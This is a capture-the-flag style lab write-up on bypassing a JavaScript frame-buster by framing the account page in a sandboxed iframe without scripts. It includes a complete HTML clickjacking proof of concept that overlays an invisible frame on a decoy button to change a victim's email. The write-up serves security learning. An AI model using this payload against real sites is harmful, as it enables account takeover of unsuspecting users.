# Clickjacking with a frame buster script

**URL:** https://YOUR-LAB-ID.web-security-academy.net
**Difficulty:** Apprentice
**Vulnerability:** Clickjacking bypassing a client-side frame-busting script

---

## Summary

The account page defends against framing with a small inline script that checks `top != self` and,
if the page is framed, blanks the document. This is a purely client-side defense implemented in
JavaScript, which means it can be neutralized entirely by preventing that script from running at
all - an iframe `sandbox` attribute without `allow-scripts` does exactly that, while still
permitting the one interaction the attack actually needs.

---

## Discovery and Exploitation

### Step 1

Confirmed the page includes an inline frame-buster:

```js
if (top != self) {
    window.addEventListener("DOMContentLoaded", function() {
        document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
```

### Step 2

Framed the page inside `<iframe sandbox="allow-forms" src="...">`. Sandboxing without
`allow-scripts` blocks ALL script execution from the framed origin, including its own frame-buster,
while `allow-forms` still permits submitting the one form the attack needs.

### Step 3

Confirmed live that the buster never fired and the account page (with its email field, prefilled
via the same URL-parameter mechanism as the prefilled-form-input lab) rendered normally inside the
sandboxed frame.

### Step 4

Measured the "Update email" button's position and overlaid a "Click me" decoy directly on top,
pinning the iframe with `position:absolute; top:0; left:0; border:none;` plus a
`body { margin:0; padding:0; }` reset on the exploit page to keep the overlay's coordinates exactly
matched to the iframe's own content, rather than leaving the iframe in normal document flow where
the browser's default margin/border can shift it by a few pixels.

### Step 5

Delivered to the simulated victim. Their click landed on the real "Update email" button inside the
sandboxed, buster-neutralized iframe, submitting the attacker's email value and solving the lab.

---

## Proof of Concept

```html
<style>
  body { margin:0; padding:0; }
  iframe {
    position:absolute;
    top:0;
    left:0;
    width:500px;
    height:700px;
    border:none;
    opacity:0.0001;
    z-index:2;
  }
  div { position:absolute; z-index:1; top:466px; left:32px; width:132px; height:32px; }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil-user.net"></iframe>
```

---

## Root Cause

The application relies solely on a client-side JavaScript frame-busting script for clickjacking
protection instead of a server-enforced header (X-Frame-Options or a CSP `frame-ancestors`
directive). Any defense that depends on script execution inside the framed document can be
disabled outright by an attacker who controls the iframe's `sandbox` attribute.

---

## CWE

- **CWE-1021: Improper Restriction of Rendered UI Layers or Frames**
- **CWE-693: Protection Mechanism Failure**
